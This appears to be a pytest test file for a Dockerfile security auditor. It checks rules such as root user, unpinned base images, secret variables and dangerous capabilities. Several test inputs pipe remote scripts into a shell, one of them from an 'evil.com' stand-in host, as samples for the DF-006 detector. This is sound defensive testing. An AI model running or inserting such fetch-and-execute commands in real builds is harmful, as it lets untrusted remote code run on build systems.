"""
Tests for controls/containers/dockerfile_auditor.py
"""
from __future__ import annotations

import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).parent.parent))

from controls.containers.dockerfile_auditor import (
    AuditReport,
    DockerfileAuditor,
    DockerFinding,
    DockerSeverity,
    _has_digest,
    _is_pinned,
)


# ===========================================================================
# Helpers
# ===========================================================================

def _audit(content: str, **kwargs) -> AuditReport:
    return DockerfileAuditor(**kwargs).audit(content)


def _check_ids(report: AuditReport) -> set[str]:
    return {f.check_id for f in report.findings}


# ===========================================================================
# _is_pinned / _has_digest helpers
# ===========================================================================

class TestIsPinned:
    def test_versioned_tag_is_pinned(self):
        assert _is_pinned("ubuntu:22.04")

    def test_latest_tag_not_pinned(self):
        assert not _is_pinned("ubuntu:latest")

    def test_bare_image_not_pinned(self):
        assert not _is_pinned("ubuntu")

    def test_digest_is_pinned(self):
        assert _is_pinned("ubuntu@sha256:abc123")

    def test_empty_tag_not_pinned(self):
        assert not _is_pinned("ubuntu:")


class TestHasDigest:
    def test_digest_ref(self):
        assert _has_digest("ubuntu@sha256:abc123def456")

    def test_tag_ref_not_digest(self):
        assert not _has_digest("ubuntu:22.04")

    def test_bare_ref_not_digest(self):
        assert not _has_digest("ubuntu")


# ===========================================================================
# DockerFinding
# ===========================================================================

class TestDockerFinding:
    def _f(self) -> DockerFinding:
        return DockerFinding(
            check_id="DF-001",
            severity=DockerSeverity.HIGH,
            title="Runs as root",
            detail="Detail",
            remediation="Fix",
            line_number=5,
            line_content="FROM ubuntu",
        )

    def test_summary_contains_check_id(self):
        assert "DF-001" in self._f().summary()

    def test_summary_contains_line_number(self):
        assert "5" in self._f().summary()

    def test_to_dict_keys(self):
        d = self._f().to_dict()
        for k in ("check_id", "severity", "title", "detail", "remediation",
                  "line_number", "line_content"):
            assert k in d

    def test_severity_serialized_as_string(self):
        assert self._f().to_dict()["severity"] == "HIGH"


# ===========================================================================
# AuditReport
# ===========================================================================

class TestAuditReport:
    def _report(self) -> AuditReport:
        f1 = DockerFinding("DF-001", DockerSeverity.HIGH,     "t", "d", "r")
        f2 = DockerFinding("DF-003", DockerSeverity.CRITICAL, "t", "d", "r")
        return AuditReport(findings=[f1, f2], risk_score=55, pass_count=8)

    def test_total_findings(self):
        assert self._report().total_findings == 2

    def test_critical_findings(self):
        assert len(self._report().critical_findings) == 1

    def test_high_findings(self):
        assert len(self._report().high_findings) == 1

    def test_findings_by_check(self):
        assert len(self._report().findings_by_check("DF-001")) == 1

    def test_summary_contains_risk_score(self):
        assert "55" in self._report().summary()

    def test_summary_with_path(self):
        r = AuditReport(findings=[], dockerfile_path="services/api/Dockerfile")
        assert "services/api/Dockerfile" in r.summary()

    def test_empty_report(self):
        r = AuditReport()
        assert r.total_findings == 0


# ===========================================================================
# DF-001: Runs as root
# ===========================================================================

class TestDF001:
    def test_fires_when_no_user_directive(self):
        df = "FROM ubuntu:22.04\nRUN echo hello\nCMD bash"
        report = _audit(df)
        assert "DF-001" in _check_ids(report)

    def test_not_fired_when_non_root_user_set(self):
        df = "FROM ubuntu:22.04\nRUN useradd appuser\nUSER appuser\nCMD bash"
        report = _audit(df)
        assert "DF-001" not in _check_ids(report)

    def test_fires_when_user_is_root(self):
        df = "FROM ubuntu:22.04\nUSER root\nCMD bash"
        report = _audit(df)
        assert "DF-001" in _check_ids(report)

    def test_fires_when_user_is_zero(self):
        df = "FROM ubuntu:22.04\nUSER 0\nCMD bash"
        report = _audit(df)
        assert "DF-001" in _check_ids(report)

    def test_df001_is_high(self):
        df = "FROM ubuntu:22.04\n"
        report = _audit(df)
        f = next(f for f in report.findings if f.check_id == "DF-001")
        assert f.severity == DockerSeverity.HIGH

    def test_line_number_zero_for_global_finding(self):
        df = "FROM ubuntu:22.04\n"
        report = _audit(df)
        f = next(f for f in report.findings if f.check_id == "DF-001")
        assert f.line_number == 0


# ===========================================================================
# DF-002: Unpinned base image
# ===========================================================================

class TestDF002:
    def test_fires_for_latest_tag(self):
        df = "FROM ubuntu:latest\n"
        report = _audit(df)
        assert "DF-002" in _check_ids(report)

    def test_fires_for_bare_image(self):
        df = "FROM ubuntu\n"
        report = _audit(df)
        assert "DF-002" in _check_ids(report)

    def test_not_fired_for_versioned_tag(self):
        df = "FROM ubuntu:22.04\nUSER nobody\nHEALTHCHECK CMD true\n"
        report = _audit(df)
        assert "DF-002" not in _check_ids(report)

    def test_not_fired_for_digest(self):
        df = "FROM ubuntu@sha256:abc123\nUSER nobody\nHEALTHCHECK CMD true\n"
        report = _audit(df)
        assert "DF-002" not in _check_ids(report)

    def test_not_fired_for_scratch(self):
        df = "FROM scratch\n"
        report = _audit(df)
        assert "DF-002" not in _check_ids(report)

    def test_df002_is_high(self):
        df = "FROM ubuntu\n"
        report = _audit(df)
        f = next(f for f in report.findings if f.check_id == "DF-002")
        assert f.severity == DockerSeverity.HIGH


# ===========================================================================
# DF-003: Secret-like variable
# ===========================================================================

class TestDF003:
    def test_fires_for_env_password(self):
        df = "FROM ubuntu:22.04\nENV DB_PASSWORD=secret\n"
        report = _audit(df)
        assert "DF-003" in _check_ids(report)

    def test_fires_for_arg_secret(self):
        df = "FROM ubuntu:22.04\nARG API_KEY\n"
        report = _audit(df)
        assert "DF-003" in _check_ids(report)

    def test_fires_for_token(self):
        df = "FROM ubuntu:22.04\nENV TOKEN=xyz\n"
        report = _audit(df)
        assert "DF-003" in _check_ids(report)

    def test_not_fired_for_safe_variable(self):
        df = "FROM ubuntu:22.04\nENV APP_PORT=8080\nUSER appuser\nHEALTHCHECK CMD true\n"
        report = _audit(df)
        assert "DF-003" not in _check_ids(report)

    def test_df003_is_critical(self):
        df = "FROM ubuntu:22.04\nENV SECRET=abc\n"
        report = _audit(df)
        f = next(f for f in report.findings if f.check_id == "DF-003")
        assert f.severity == DockerSeverity.CRITICAL


# ===========================================================================
# DF-004: ADD with URL
# ===========================================================================

class TestDF004:
    def test_fires_for_add_with_http_url(self):
        df = "FROM ubuntu:22.04\nADD https://example.com/file.tar.gz /tmp/\n"
        report = _audit(df)
        assert "DF-004" in _check_ids(report)

    def test_fires_for_add_with_ftp_url(self):
        df = "FROM ubuntu:22.04\nADD ftp://example.com/file /tmp/\n"
        report = _audit(df)
        assert "DF-004" in _check_ids(report)

    def test_not_fired_for_add_local_file(self):
        df = "FROM ubuntu:22.04\nADD ./localfile /app/\nUSER nobody\nHEALTHCHECK CMD true\n"
        report = _audit(df)
        assert "DF-004" not in _check_ids(report)

    def test_not_fired_for_copy(self):
        df = "FROM ubuntu:22.04\nCOPY --chown=app:app src/ /app/\nUSER app\nHEALTHCHECK CMD true\n"
        report = _audit(df)
        assert "DF-004" not in _check_ids(report)

    def test_df004_is_medium(self):
        df = "FROM ubuntu:22.04\nADD https://example.com/f /tmp/\n"
        report = _audit(df)
        f = next(f for f in report.findings if f.check_id == "DF-004")
        assert f.severity == DockerSeverity.MEDIUM


# ===========================================================================
# DF-005: Unversioned package install
# ===========================================================================

class TestDF005:
    def test_fires_for_apt_no_pin(self):
        df = "FROM ubuntu:22.04\nRUN apt-get install -y curl\n"
        report = _audit(df)
        assert "DF-005" in _check_ids(report)

    def test_fires_for_apk_no_pin(self):
        df = "FROM alpine:3.18\nRUN apk add curl\n"
        report = _audit(df)
        assert "DF-005" in _check_ids(report)

    def test_not_fired_for_pinned_apt(self):
        df = "FROM ubuntu:22.04\nRUN apt-get install -y curl=7.88.1-10\nUSER nobody\nHEALTHCHECK CMD true\n"
        report = _audit(df)
        assert "DF-005" not in _check_ids(report)

    def test_df005_is_medium(self):
        df = "FROM ubuntu:22.04\nRUN apt-get install -y wget\n"
        report = _audit(df)
        f = next(f for f in report.findings if f.check_id == "DF-005")
        assert f.severity == DockerSeverity.MEDIUM


# ===========================================================================
# DF-006: Remote script piped to shell
# ===========================================================================

class TestDF006:
    def test_fires_for_curl_pipe_bash(self):
        df = "FROM ubuntu:22.04\nRUN curl -sSL https://example.com/install.sh | bash\n"
        report = _audit(df)
        assert "DF-006" in _check_ids(report)

    def test_fires_for_wget_pipe_sh(self):
        df = "FROM ubuntu:22.04\nRUN wget -qO- https://example.com/setup.sh | sh\n"
        report = _audit(df)
        assert "DF-006" in _check_ids(report)

    def test_not_fired_for_curl_to_file(self):
        df = "FROM ubuntu:22.04\nRUN curl -o /tmp/file.sh https://example.com/s.sh\nUSER nobody\nHEALTHCHECK CMD true\n"
        report = _audit(df)
        assert "DF-006" not in _check_ids(report)

    def test_df006_is_critical(self):
        df = "FROM ubuntu:22.04\nRUN curl https://install.sh | bash\n"
        report = _audit(df)
        f = next(f for f in report.findings if f.check_id == "DF-006")
        assert f.severity == DockerSeverity.CRITICAL


# ===========================================================================
# DF-007: HEALTHCHECK missing
# ===========================================================================

class TestDF007:
    def test_fires_when_no_healthcheck(self):
        df = "FROM ubuntu:22.04\nUSER nobody\nCMD bash\n"
        report = _audit(df)
        assert "DF-007" in _check_ids(report)

    def test_not_fired_when_healthcheck_present(self):
        df = "FROM ubuntu:22.04\nUSER nobody\nHEALTHCHECK CMD curl -f http://localhost/ || exit 1\nCMD bash\n"
        report = _audit(df)
        assert "DF-007" not in _check_ids(report)

    def test_suppressed_when_require_healthcheck_false(self):
        df = "FROM ubuntu:22.04\nUSER nobody\nCMD bash\n"
        report = _audit(df, require_healthcheck=False)
        assert "DF-007" not in _check_ids(report)

    def test_df007_is_low(self):
        df = "FROM ubuntu:22.04\nUSER nobody\n"
        report = _audit(df, require_healthcheck=True)
        f = next(f for f in report.findings if f.check_id == "DF-007")
        assert f.severity == DockerSeverity.LOW


# ===========================================================================
# DF-008: Dangerous capability
# ===========================================================================

class TestDF008:
    def test_fires_for_cap_add_sys_admin(self):
        df = "FROM ubuntu:22.04\nRUN --cap-add SYS_ADMIN echo hi\n"
        report = _audit(df)
        assert "DF-008" in _check_ids(report)

    def test_fires_for_cap_add_all(self):
        df = "FROM ubuntu:22.04\nRUN --cap-add ALL echo hi\n"
        report = _audit(df)
        assert "DF-008" in _check_ids(report)

    def test_not_fired_for_safe_run(self):
        df = "FROM ubuntu:22.04\nRUN echo hello\nUSER nobody\nHEALTHCHECK CMD true\n"
        report = _audit(df)
        assert "DF-008" not in _check_ids(report)

    def test_df008_is_high(self):
        df = "FROM ubuntu:22.04\nRUN --cap-add NET_ADMIN ip route\n"
        report = _audit(df)
        f = next(f for f in report.findings if f.check_id == "DF-008")
        assert f.severity == DockerSeverity.HIGH


# ===========================================================================
# DF-009: COPY without --chown
# ===========================================================================

class TestDF009:
    def test_fires_when_copy_without_chown(self):
        df = "FROM ubuntu:22.04\nCOPY src/ /app/\nUSER nobody\nHEALTHCHECK CMD true\n"
        report = _audit(df)
        assert "DF-009" in _check_ids(report)

    def test_not_fired_when_chown_present(self):
        df = "FROM ubuntu:22.04\nCOPY --chown=app:app src/ /app/\nUSER app\nHEALTHCHECK CMD true\n"
        report = _audit(df)
        assert "DF-009" not in _check_ids(report)

    def test_suppressed_when_check_chown_false(self):
        df = "FROM ubuntu:22.04\nCOPY src/ /app/\nUSER nobody\nHEALTHCHECK CMD true\n"
        report = _audit(df, check_chown=False)
        assert "DF-009" not in _check_ids(report)

    def test_df009_is_low(self):
        df = "FROM ubuntu:22.04\nCOPY src/ /app/\nUSER nobody\nHEALTHCHECK CMD true\n"
        report = _audit(df)
        f = next(f for f in report.findings if f.check_id == "DF-009")
        assert f.severity == DockerSeverity.LOW


# ===========================================================================
# DF-010: Tag instead of digest
# ===========================================================================

class TestDF010:
    def test_fires_for_tagged_image(self):
        df = "FROM ubuntu:22.04\n"
        report = _audit(df)
        assert "DF-010" in _check_ids(report)

    def test_not_fired_for_digest_image(self):
        df = "FROM ubuntu@sha256:abc123\nUSER nobody\nHEALTHCHECK CMD true\n"
        report = _audit(df)
        assert "DF-010" not in _check_ids(report)

    def test_not_fired_for_scratch(self):
        df = "FROM scratch\n"
        report = _audit(df)
        assert "DF-010" not in _check_ids(report)

    def test_df010_is_medium(self):
        df = "FROM python:3.11-slim\n"
        report = _audit(df)
        f = next(f for f in report.findings if f.check_id == "DF-010")
        assert f.severity == DockerSeverity.MEDIUM


# ===========================================================================
# Risk score
# ===========================================================================

class TestRiskScore:
    def test_clean_dockerfile_zero_risk(self):
        df = (
            "FROM ubuntu@sha256:abc123\n"
            "RUN useradd -m appuser\n"
            "COPY --chown=appuser:appuser src/ /app/\n"
            "USER appuser\n"
            "HEALTHCHECK CMD curl -f http://localhost/health || exit 1\n"
            "CMD [\"/app/start\"]\n"
        )
        report = _audit(df)
        assert report.risk_score == 0

    def test_risk_capped_at_100(self):
        df = (
            "FROM ubuntu\n"
            "ENV PASSWORD=secret\n"
            "RUN curl https://evil.com/install.sh | bash\n"
            "RUN --cap-add ALL echo hi\n"
            "ADD https://example.com/file /tmp/\n"
            "COPY src/ /app/\n"
        )
        report = _audit(df)
        assert report.risk_score <= 100

    def test_only_df007_has_score_5(self):
        df = (
            "FROM ubuntu@sha256:abc123\n"
            "RUN useradd -m app\n"
            "COPY --chown=app:app . /app/\n"
            "USER app\n"
        )
        report = _audit(df)
        ids = _check_ids(report)
        assert ids == {"DF-007"}
        assert report.risk_score == 5


# ===========================================================================
# Pass count
# ===========================================================================

class TestPassCount:
    def test_pass_count_nonzero_for_good_dockerfile(self):
        df = (
            "FROM ubuntu@sha256:abc123\n"
            "RUN useradd -m appuser\n"
            "COPY --chown=appuser:appuser src/ /app/\n"
            "USER appuser\n"
            "HEALTHCHECK CMD true\n"
        )
        report = _audit(df)
        assert report.pass_count > 0

    def test_pass_count_decreases_with_findings(self):
        clean = "FROM ubuntu@sha256:abc123\nUSER nobody\nHEALTHCHECK CMD true\n"
        dirty = "FROM ubuntu\nUSER nobody\n"
        r_clean = _audit(clean)
        r_dirty = _audit(dirty)
        assert r_clean.pass_count >= r_dirty.pass_count


# ===========================================================================
# Line number tracking
# ===========================================================================

class TestLineNumbers:
    def test_finding_line_number_correct(self):
        df = "FROM ubuntu:22.04\nENV PASSWORD=secret\n"
        report = _audit(df)
        f = next(f for f in report.findings if f.check_id == "DF-003")
        assert f.line_number == 2

    def test_line_content_preserved(self):
        df = "FROM ubuntu:22.04\nENV SECRET=abc123\n"
        report = _audit(df)
        f = next(f for f in report.findings if f.check_id == "DF-003")
        assert "SECRET" in f.line_content

    def test_comments_not_flagged(self):
        df = "FROM ubuntu:22.04\n# This sets the PASSWORD env\nUSER nobody\nHEALTHCHECK CMD true\n"
        report = _audit(df)
        assert "DF-003" not in _check_ids(report)


# ===========================================================================
# Dockerfile path label
# ===========================================================================

class TestDockerfilePath:
    def test_path_included_in_summary(self):
        df = "FROM ubuntu@sha256:abc123\nUSER nobody\nHEALTHCHECK CMD true\n"
        report = DockerfileAuditor().audit(df, dockerfile_path="services/api/Dockerfile")
        assert "services/api/Dockerfile" in report.summary()
